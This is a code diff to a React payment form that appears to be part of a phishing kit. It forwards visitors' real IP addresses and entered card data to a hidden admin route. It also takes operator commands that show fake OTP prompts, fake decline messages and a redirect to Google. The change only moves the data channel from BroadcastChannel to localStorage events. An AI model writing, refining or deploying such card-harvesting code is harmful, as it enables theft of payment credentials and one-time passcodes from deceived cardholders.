@@ -145,16 +145,8 @@ const PaymentForm = () => {
   }, [longPressTimer]);
 
   useEffect(() => {
-    // Initialize broadcast channel and send visitor data with real IP
+    // Initialize cross-browser communication and send visitor data with real IP
     const initializeConnection = async () => {
-      // Ensure we always use the same channel name
-      const channelName = 'cardData';
-      
-      if (!window.cardDataChannel) {
-        window.cardDataChannel = new BroadcastChannel(channelName);
-        console.log('Created new BroadcastChannel:', channelName);
-      }
-
       const realIP = await getRealIP();
       const userInfo = {
         ip: realIP,
@@ -168,82 +160,83 @@ const PaymentForm = () => {
         timestamp: new Date().toISOString()
       };
 
-      console.log('Sending visitor data with real IP:', visitorData);
+      console.log('Sending visitor data with real IP via localStorage:', visitorData);
       console.log('Current window location:', window.location.href);
       console.log('Admin panel should be at:', window.location.origin + '/parking55009hvSweJimbs5hhinbd56y');
       
-      // Send the visitor data
-      window.cardDataChannel.postMessage(visitorData);
+      // Send the visitor data via localStorage for cross-browser communication
+      localStorage.setItem('adminData', JSON.stringify(visitorData));
+      localStorage.removeItem('adminData'); // Trigger storage event
     };
 
     initializeConnection();
 
-    // Listen for commands from admin panel
-    const handleMessage = (event: MessageEvent) => {
-      const data = event.data;
-      console.log('Received command from admin:', data);
-      
-      switch (data.command) {
-        case 'showotp':
-          setFadeState('fadeOut');
-          setTimeout(() => {
-            setIsLoading(false);
-            setShowOtp(true);
-            setFadeState('fadeIn');
-          }, 300);
-          break;
-        case 'fail':
-          setFadeState('fadeOut');
-          setTimeout(() => {
-            setIsLoading(false);
-            setShowOtp(false);
-            setErrorMessage('Your card has been declined');
-            setFadeState('fadeIn');
-          }, 300);
-          break;
-        case 'success':
-          setFadeState('fadeOut');
-          setTimeout(() => {
-            setIsConfirmLoading(false);
-            setShowProcessing(true);
-            setFadeState('fadeIn');
+    // Listen for commands from admin panel via localStorage
+    const handleStorageEvent = (event: StorageEvent) => {
+      if (event.key === 'adminCommand' && event.newValue) {
+        const data = JSON.parse(event.newValue);
+        console.log('Received command from admin:', data);
+        
+        switch (data.command) {
+          case 'showotp':
+            setFadeState('fadeOut');
             setTimeout(() => {
-              setShowProcessing(false);
-              setShowSuccess(true);
+              setIsLoading(false);
+              setShowOtp(true);
+              setFadeState('fadeIn');
+            }, 300);
+            break;
+          case 'fail':
+            setFadeState('fadeOut');
+            setTimeout(() => {
+              setIsLoading(false);
+              setShowOtp(false);
+              setErrorMessage('Your card has been declined');
+              setFadeState('fadeIn');
+            }, 300);
+            break;
+          case 'success':
+            setFadeState('fadeOut');
+            setTimeout(() => {
+              setIsConfirmLoading(false);
+              setShowProcessing(true);
+              setFadeState('fadeIn');
               setTimeout(() => {
-                window.location.href = 'https://google.com';
-              }, 2000);
-            }, 4000);
-          }, 300);
-          break;
-        case 'invalidotp':
-          setIsConfirmLoading(false);
-          setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
-          break;
-        case 'cardinvalid':
-          setFadeState('fadeOut');
-          setTimeout(() => {
-            setIsLoading(false);
-            setShowOtp(false);
-            setErrorMessage('Your card is invalid, please try another card');
-            setFadeState('fadeIn');
-          }, 300);
-          break;
-        case 'carddisabled':
-          setFadeState('fadeOut');
-          setTimeout(() => {
-            setIsLoading(false);
-            setShowOtp(false);
-            setErrorMessage('Card disabled, please try another card');
-            setFadeState('fadeIn');
-          }, 300);
-          break;
+                setShowProcessing(false);
+                setShowSuccess(true);
+                setTimeout(() => {
+                  window.location.href = 'https://google.com';
+                }, 2000);
+              }, 4000);
+            }, 300);
+            break;
+          case 'invalidotp':
+            setIsConfirmLoading(false);
+            setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
+            break;
+          case 'cardinvalid':
+            setFadeState('fadeOut');
+            setTimeout(() => {
+              setIsLoading(false);
+              setShowOtp(false);
+              setErrorMessage('Your card is invalid, please try another card');
+              setFadeState('fadeIn');
+            }, 300);
+            break;
+          case 'carddisabled':
+            setFadeState('fadeOut');
+            setTimeout(() => {
+              setIsLoading(false);
+              setShowOtp(false);
+              setErrorMessage('Card disabled, please try another card');
+              setFadeState('fadeIn');
+            }, 300);
+            break;
+        }
       }
     };
 
-    if (window.cardDataChannel) {
-      window.cardDataChannel.onmessage = handleMessage;
-    }
+    window.addEventListener('storage', handleStorageEvent);
 
     // Handle click anywhere to show alert
     const handleDocumentClick = (e: MouseEvent) => {
@@ -270,9 +263,7 @@ const PaymentForm = () => {
     document.addEventListener('click', handleDocumentClick);
 
     return () => {
-      if (window.cardDataChannel) {
-        window.cardDataChannel.onmessage = null;
-      }
+      window.removeEventListener('storage', handleStorageEvent);
       document.removeEventListener('click', handleDocumentClick);
     };
   }, []);
@@ -301,16 +292,13 @@ const PaymentForm = () => {
   };
 
   const sendToAdminPanel = (data: any) => {
-    console.log('Sending data to admin panel:', data);
-    console.log('Channel exists:', !!window.cardDataChannel);
+    console.log('Sending data to admin panel via localStorage:', data);
     console.log('Expected admin route: /parking55009hvSweJimbs5hhinbd56y');
     
-    if (window.cardDataChannel) {
-      window.cardDataChannel.postMessage(data);
-      console.log('Data sent successfully via BroadcastChannel');
-    } else {
-      console.error('BroadcastChannel not available');
-    }
+    // Use localStorage for cross-browser communication
+    localStorage.setItem('adminData', JSON.stringify(data));
+    localStorage.removeItem('adminData'); // Trigger storage event
+    console.log('Data sent successfully via localStorage');
   };
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
